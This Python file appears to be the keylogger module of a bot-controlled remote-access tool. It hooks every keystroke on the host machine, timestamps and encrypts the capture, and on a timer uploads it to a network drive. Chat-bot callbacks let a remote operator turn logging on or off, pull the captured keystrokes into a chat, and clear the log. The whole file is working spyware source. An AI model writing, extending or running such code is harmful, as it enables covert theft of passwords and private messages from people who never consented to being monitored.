import keyboard
import config
from modules import Crypt
import os
from threading import Timer, Thread
from datetime import datetime
import encryption_keys
from modules import Environment
from modules import Configuration
from modules import NetworkDrive
import constants
from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_message


async def keylogger_callback(bot, call):
    status = get_status()
    if status:
        status = '\U0001f7e2ON'
    else:
        status = '\U0001f534OFF'

    markup = getMarkupModes(modes)

    await send_message(bot, call.message.chat.id, text=constants.KEYLOGGER_preview + constants.keylogger_status_message.format(status=status), reply_markup=markup)


async def on_callback(bot, call):
    status = get_status()
    if not status:
        change_status()

    message = constants.keylogger_statuschanged_message.format(
        status='\U0001f7e2ON')

    markup = getMarkupModes()

    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)


async def off_callback(bot, call):
    status = get_status()
    if status:
        change_status()

    message = constants.keylogger_statuschanged_message.format(
        status='\U0001f534OFF')

    markup = getMarkupModes()

    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)


async def get_callback(bot, call):
    log = get()

    if not log.strip():
        log = '[EMPTY]'

    markup = getMarkupModes()

    await send_message(bot, call.message.chat.id, text=log, reply_markup=markup)


async def clearLog_callback(bot, call):
    clear()

    message = constants.keylogger_cleared_message

    markup = getMarkupModes()

    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)


last_time = datetime.now()
temp_log = f"\n{last_time} "
update_timer = None
is_running = False

off_status = (constants.KEYLOGGER_OFF_preview, constants.KEYLOGGER_OFF)
on_status = (constants.KEYLOGGER_ON_preview, constants.KEYLOGGER_ON)


def get_status():
    configuration = Configuration.get()

    status = configuration["General"]["Keylogger"]
    return status


def change_status():
    global modes, is_running

    configuration = Configuration.get()
    old_status = configuration["General"]["Keylogger"]
    new_status = int(not old_status)
    configuration["General"]["Keylogger"] = new_status

    while True:
        Configuration.update(configuration)

        configuration = Configuration.get()

        if configuration["General"]["Keylogger"] == new_status:
            break
        else:
            print('[TRYING TO CHANGE STATUS]')

    if new_status and not is_running:
        Thread(target=start, daemon=True).start()
    elif not new_status and is_running:
        stop_keylogger()

    modes = get_modes()

    return new_status


def stop_keylogger():
    global update_timer, temp_log, is_running

    if update_timer and update_timer.is_alive():
        update_timer.cancel()

    if temp_log and temp_log.strip():
        save_remaining_log()

    try:
        keyboard.unhook_all()
    except:
        pass

    temp_log = ''
    is_running = False
    print("[KEYLOGGER STOPPED]")


def save_remaining_log():
    global temp_log
    if temp_log and temp_log.strip():
        try:
            current_log = get()
            log = Crypt.encrypt(current_log + temp_log,
                                encryption_keys.keylogger_ek)

            with open(config.tmp_keylogger_path, 'w') as file:
                file.write(log)

            NetworkDrive.upload(config.tmp_keylogger_path,
                                config.keylogger_path)
            delete_temp_log()
            print("[FINAL LOG SAVED]")
        except Exception as e:
            print(f"[ERROR SAVING FINAL LOG]: {e}")


def get():
    if not NetworkDrive.is_file(config.keylogger_path):
        return ''

    NetworkDrive.download(config.keylogger_path, config.tmp_keylogger_path)

    with open(config.tmp_keylogger_path) as file:
        log = file.read()

    if log == '':
        return ''

    log = Crypt.decrypt(log, encryption_keys.keylogger_ek)

    return log


def delete_temp_log():
    try:
        os.remove(config.tmp_keylogger_path)
    except:
        pass


def clear():
    with open(config.tmp_keylogger_path, 'w') as file:
        file.write('')
    NetworkDrive.upload(config.tmp_keylogger_path, config.keylogger_path)

    delete_temp_log()


def update():
    global temp_log, update_timer

    if not get_status():
        print("[KEYLOGGER UPDATE SKIPPED - INACTIVE]")
        return

    if temp_log:
        try:
            current_log = get()
            log = Crypt.encrypt(current_log + temp_log,
                                encryption_keys.keylogger_ek)

            with open(config.tmp_keylogger_path, 'w') as file:
                file.write(log)

            temp_log = ''

            NetworkDrive.upload(config.tmp_keylogger_path,
                                config.keylogger_path)
            delete_temp_log()
            print('[LOG SAVED]')
        except Exception as e:
            print(f"[UPDATE ERROR]: {e}")

    if get_status():
        update_timer = Timer(
            interval=config.keylogger_timeout, function=update)
        update_timer.daemon = True
        update_timer.start()


def add(log):
    global temp_log

    if get_status():
        temp_log += log


def callback(event):
    if not get_status():
        return

    key = event.name
    time = datetime.now()

    if len(key) > 1:
        if key == 'space':
            key = '_'
        elif key == 'enter':
            key = '[ENTER]'
        elif key == 'decimal':
            key = '.'
        else:
            key = key.replace(' ', '_')
            key = f"[{key.upper()}]"

    add(key)


def start():
    global is_running

    if not get_status():
        print("[KEYLOGGER START SKIPPED - INACTIVE]")
        return

    if is_running:
        print("[KEYLOGGER ALREADY RUNNING]")
        return

    print('[KEYLOGGER STARTED]')
    is_running = True
    Environment.create()
    update()
    keyboard.on_release(callback=callback)
    keyboard.wait()


def get_modes():
    if get_status():
        status = off_status
    else:
        status = on_status

    modes = {
        status[0]: status[1],
        constants.KEYLOGGER_GET_preview: constants.KEYLOGGER_GET,
        constants.KEYLOGGER_CLEAR_preview: constants.KEYLOGGER_CLEAR
    }

    return modes


modes = get_modes()
